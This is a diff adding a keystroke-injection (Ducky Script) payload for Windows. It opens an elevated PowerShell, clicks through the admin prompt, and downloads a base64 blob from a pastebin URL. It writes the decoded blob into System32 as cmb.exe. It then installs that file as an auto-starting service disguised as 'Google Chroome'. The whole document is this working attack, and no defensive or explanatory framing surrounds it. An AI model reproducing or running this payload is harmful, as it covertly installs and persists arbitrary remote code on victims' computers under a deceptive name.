@@ -1,0 +1,29 @@
+DEFAULT_DELAY 1000
+DELAY 2000
+GUI R
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+ALT y
+STRING $downloadedString = (Invoke-webrequest -URI "https://pastebin.com/raw/cJS7SSxm")
+ENTER
+STRING [IO.File]::WriteAllBytes("C:/Windows/System32/cmb.exe", [Convert]::FromBase64String($downloadedString))
+ENTER
+STRING $params = @{
+ENTER
+STRING   Name = "TestService"
+ENTER
+STRING   BinaryPathName = '"C:\Windows\System32\cmb.exe"'
+ENTER
+STRING   DisplayName = "Google Chroome"
+ENTER
+STRING   StartupType = "Automatic"
+ENTER
+STRING   Description = "For internet browsing and such things."
+ENTER
+STRING }
+ENTER
+STRING New-Service @params
+ENTER
+ALT TAB
+STRING exit
+ENTER
